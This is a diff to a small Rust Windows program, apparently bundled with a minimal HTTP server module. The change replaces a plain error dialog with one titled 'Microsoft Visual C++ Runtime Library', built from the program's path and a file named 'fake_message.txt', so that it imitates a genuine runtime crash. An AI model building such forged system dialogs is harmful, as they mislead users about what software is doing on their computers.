@@ -1,4 +1,5 @@
 use std::collections::HashMap;
+use std::env::current_exe;
 use std::net::{Ipv4Addr, SocketAddrV4};
 
 mod minhttpd;
@@ -24,14 +25,21 @@ extern "C" {
 
 fn message_box(text: &[u8], caption: &[u8]) {
     unsafe {
-        MessageBoxA(0, text.as_ptr(), caption.as_ptr(), 0x30);
+        MessageBoxA(0, text.as_ptr(), caption.as_ptr(), 0x10);
     }
 }
 
 fn main() {
+    let mut program = current_exe().map_or("".to_string(), |x| x.to_string_lossy().into_owned());
+    let len = program.len();
+    if len >= 12 {
+        program.truncate(12);
+        program.push_str("...");
+    }
+
     message_box(
-        b"\xB7\xC7\xB3\xA3\xB1\xA7\xC7\xB8\xA3\xAC\xC4\xFA\xB5\xC4\xD7\xF7\xD2\xB5\xCF\xB5\xCD\xB3\xB2\xBB\xD6\xA7\xB3\xD6\xD5\xE2\xB8\xF6\xB3\xCC\xCA\xBD\0",
-        b"\xB4\xED\xCE\xF3\0"
+        format!(concat!(include_str!("../res/fake_message.txt"), "\0"), program).as_bytes(),
+        "Microsoft Visual C++ Runtime Library".as_bytes()
     );
     return;
 
